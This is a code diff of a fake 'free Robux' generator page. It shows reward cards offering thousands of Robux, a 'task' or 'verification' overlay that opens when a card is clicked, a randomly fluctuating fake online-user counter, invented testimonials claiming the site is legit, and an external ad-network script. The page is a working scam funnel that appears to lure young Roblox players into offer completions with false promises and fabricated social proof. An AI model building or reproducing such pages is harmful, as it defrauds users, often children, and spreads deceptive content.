-                                    page2.classList.remove('hidden');
-                                    window.scrollTo(0, 0);
-                                }, 1000);
-                            }
-                            lineIndex++;
-                            printLine();
-                        }, line.delay / 2); // Faster simulation
-                    }
+                           page1.classList.add('hidden');
+                           page2.classList.remove('hidden');
+                           window.scrollTo(0, 0);
+                        }, 500);
+                    }, 500); // Faster delay before transition
                 }
-                printLine();
-            });
-
-
-            // --- Reward Selection ---
-            const rewards = [
-                { amount: 800, label: "Starter Pack" },
-                { amount: 1700, label: "Player's Choice" },
-                { amount: 4500, label: "Pro Gamer Bundle" },
-                { amount: 10000, label: "Ultimate Fan Kit" }
-            ];
-
-            rewards.forEach((reward, index) => {
-                const card = document.createElement('div');
-                card.className = 'glowing-card p-4 rounded-lg cursor-pointer flex justify-between items-center';
-                card.dataset.amount = reward.amount;
-                card.innerHTML = `
-                    <div class="flex items-center gap-4">
-                        <img src="https://i.ibb.co/Q8Q5v9R/robux-coin.png" alt="Robux Coin" class="w-10 h-10" onerror="this.style.display='none'">
-                        <div class="text-left">
-                            <p class="text-xl font-bold">${reward.amount.toLocaleString()} Robux</p>
-                            <p class="text-sm text-gray-400">${reward.label}</p>
-                        </div>
-                    </div>
-                    <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 text-gray-400 group-hover:text-white transition-colors" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" />
-                    </svg>
-                `;
-                card.addEventListener('click', () => {
-                    playClickSound();
-                    // Deselect other cards
-                    document.querySelectorAll('.glowing-card').forEach(c => c.classList.remove('selected-card'));
-                    // Select this card
-                    card.classList.add('selected-card');
-                    confirmSelectionBtn.disabled = false;
-                });
-                rewardsContainer.appendChild(card);
-});
-            
-            confirmSelectionBtn.addEventListener('click', () => {
-                if (confirmSelectionBtn.disabled) return;
-                playSuccessSound();
-                taskModal.classList.remove('hidden');
-            });
-            
-            closeModalBtn.addEventListener('click', () => {
-                playClickSound();
-                taskModal.classList.add('hidden');
-            });
-
-            // --- Background Particles ---
-            const particlesContainer = document.getElementById('particles-container');
-            const numParticles = 50;
-            for (let i = 0; i < numParticles; i++) {
-                const particle = document.createElement('div');
-                particle.className = 'particle';
-                const size = Math.random() * 5 + 1;
-                particle.style.width = `${size}px`;
-                particle.style.height = `${size}px`;
-                particle.style.left = `${Math.random() * 100}%`;
-                particle.style.top = `${Math.random() * 100}%`;
-                particle.style.animationDelay = `${Math.random() * 25}s`;
-                particle.style.animationDuration = `${15 + Math.random() * 10}s`;
-                particlesContainer.appendChild(particle);
-            }
-
-            // --- Social Proof: Online Counter & Testimonials ---
-            const onlineCounter = document.getElementById('online-counter');
-            setInterval(() => {
-                const currentCount = parseInt(onlineCounter.textContent.replace(',', ''));
-                const newCount = currentCount + Math.floor(Math.random() * 10) - 4;
-                onlineCounter.textContent = newCount.toLocaleString();
-            }, 3000);
-
-            const testimonials = [
-                { name: "CoolGamer123", text: "Wow, I can't believe it actually worked! Got my 4,500 Robux in minutes. This site is legit!" },
-                { name: "RobloxFanatic_XX", text: "Was skeptical at first but I just received my Robux. The offers were easy to complete. Thank you so much!" },
-                { name: "EpicBuilder", text: "Finally a site that delivers. I'm already planning what to buy in the catalog. Highly recommended." },
-                { name: "JennyPlays", text: "My friends told me about this and I'm so glad they did. Earning Robux has never been easier." }
-            ];
-            
-            const carouselContainer = document.getElementById('testimonials-carousel');
-            let currentTestimonial = 0;
-
-            function showTestimonial(index) {
-                const testimonial = testimonials[index];
-                carouselContainer.innerHTML = `
-                    <div class="absolute inset-0 flex flex-col justify-center items-center p-6 bg-[#1A1A1A]/70 rounded-lg border border-purple-500/30 transition-opacity duration-500 opacity-0 animate-fade-in-out">
-                        <p class="text-lg text-white italic">"${testimonial.text}"</p>
-                        <p class="mt-4 font-bold text-[#CFFF04]">- ${testimonial.name}</p>
-                    </div>
-                `;
             }
             
-            // CSS for fade-in-out animation
-            const style = document.createElement('style');
-            style.innerHTML = `
-                @keyframes fade-in-out {
-                    0%, 100% { opacity: 0; }
-                    10%, 90% { opacity: 1; }
-                }
-                .animate-fade-in-out {
-                    animation: fade-in-out 5s ease-in-out;
-                }
-                @keyframes shake {
-                    0%, 100% { transform: translateX(0); }
-                    25% { transform: translateX(-5px); }
-                    75% { transform: translateX(5px); }
-                }
-                .animate-shake {
-                    animation: shake 0.3s linear;
-                }
-                @keyframes fade-in {
-                    from { opacity: 0; transform: scale(0.9); }
-                    to { opacity: 1; transform: scale(1); }
-                }
-                .animate-fade-in {
-                    animation: fade-in 0.3s ease-out forwards;
-                }
-            `;
-            document.head.appendChild(style);
-
-
-            setInterval(() => {
-                currentTestimonial = (currentTestimonial + 1) % testimonials.length;
-                showTestimonial(currentTestimonial);
-            }, 5000);
-
-            showTestimonial(0); // Initial call
+            showNextMessage();
         });
+
+        // Handle reward card clicks
+        rewardCards.forEach(card => {
+            card.addEventListener('click', () => {
+                verificationOverlay.classList.remove('hidden');
+            });
+        });
+
+        // Testimonial carousel auto-scroll
+        const carousel = document.getElementById('carousel');
+        let isScrolling = false;
+
+        setInterval(() => {
+            if (document.hasFocus() && !isScrolling) {
+                const scrollWidth = carousel.scrollWidth;
+                const clientWidth = carousel.clientWidth;
+                if (carousel.scrollLeft + clientWidth >= scrollWidth) {
+                    carousel.scrollLeft = 0;
+                } else {
+                    carousel.scrollLeft += clientWidth;
+                }
+            }
+        }, 5000); // Change slide every 5 seconds
+        
+        carousel.addEventListener('mouseenter', () => isScrolling = true);
+        carousel.addEventListener('mouseleave', () => isScrolling = false);
+
     </script>
-    <!-- Social Bar Ad Code -->
+    
+    <!-- Social Bar Ad Script -->
     <script type='text/javascript' src='//pl27260749.revenuecpmgate.com/3a/fb/c2/3afbc2134d1e3c69ceffd895ea1138fd.js'></script>
+
 </body>
 </html>
 
